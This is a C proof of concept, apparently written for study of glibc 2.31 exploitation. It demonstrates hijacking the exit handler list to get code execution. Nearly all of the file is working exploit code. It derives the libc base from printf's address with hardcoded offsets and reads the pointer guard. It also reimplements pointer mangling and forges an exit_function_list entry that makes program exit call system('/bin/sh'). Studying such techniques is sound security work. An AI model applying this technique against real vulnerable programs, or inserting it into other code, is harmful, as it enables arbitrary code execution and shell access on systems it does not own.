/* libc: 2.31 */
#include <stdio.h>
#include <stdlib.h>

/* 利用點 */
// https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/exit.c#L100
/* mangle */
// https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/unix/sysv/linux/x86_64/sysdep.h#L388


/////////////////////////////////////////////////////////////////////////////////
//  mygdb➤  ptype /o struct exit_function_list 
//  /* offset    |  size */  type = struct exit_function_list {
//  /*    0      |     8 */    struct exit_function_list *next;
//  /*    8      |     8 */    size_t idx;
//  /*   16      |  1024 */    struct exit_function fns[32];
//  
//                             /* total size (bytes): 1040 */
//                           }
//  mygdb➤  ptype /o struct exit_function
//  /* offset    |  size */  type = struct exit_function {
//  /*    0      |     8 */    long flavor;
//  /*    8      |    24 */    union {
//  /*                 8 */        void (*at)(void);
//  /*                16 */        struct {
//  /*    8      |     8 */            void (*fn)(int, void *);
//  /*   16      |     8 */            void *arg;
//  
//                                     /* total size (bytes):   16 */
//                                 } on;
//  /*                24 */        struct {
//  /*    8      |     8 */            void (*fn)(void *, int);
//  /*   16      |     8 */            void *arg;
//  /*   24      |     8 */            void *dso_handle;
//  
//                                     /* total size (bytes):   24 */
//                                 } cxa;
//  /* 16-byte padding  */
//  
//                                 /* total size (bytes):   24 */
//                             } func;
//  
//                             /* total size (bytes):   32 */
//                           }
/////////////////////////////////////////////////////////////////////////////////

enum
{
  ef_free,        /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

#define printf_offset                        (0x64e10)
#define __exit_funcs_offset                  (0x1eb718)
#define __pointer_chk_guard_local_rip_offset (0x1f3570)                 // see PTR_DEMAGLE

int64_t libc_base;
int64_t *__exit_funcs_ptr;
int64_t __pointer_chk_guard_local_rip;
int64_t buf[0x100];
char sh[] = "/bin/sh";


int64_t mangle(int64_t a)
{
    int64_t tmp = a ^ __pointer_chk_guard_local_rip;
    int64_t hi = tmp & 0xffff800000000000;
    return (tmp<<0x11) + ((hi>>(64-0x11))&0x1ffff);
}

int64_t demangle(int64_t a)
{
    int64_t lo = a&0x1ffff;
    int64_t tmp = (a>>0x11) & (~(0xffff8000000000000));
    return ((lo<<(64-0x11))+tmp) ^ __pointer_chk_guard_local_rip;
    
}

int main()
{
    libc_base                      = printf - printf_offset;
    __exit_funcs_ptr              = libc_base + __exit_funcs_offset;                           
    __pointer_chk_guard_local_rip  = *(int64_t *)(libc_base + __pointer_chk_guard_local_rip_offset);  

    int i = 0;
    buf[i++] = NULL;
    buf[i++] = 0x1;    /* idx  */
    buf[i++] = 0x4;    /* flavor (ef_cxa) */
    buf[i++] = mangle(system); /* func->cxa->fn */
    buf[i++] = &sh;        /* func->cxa->arg */
    buf[i++] = 0;          /* func->cxa->dso_handle */

    *__exit_funcs_ptr = buf;

}
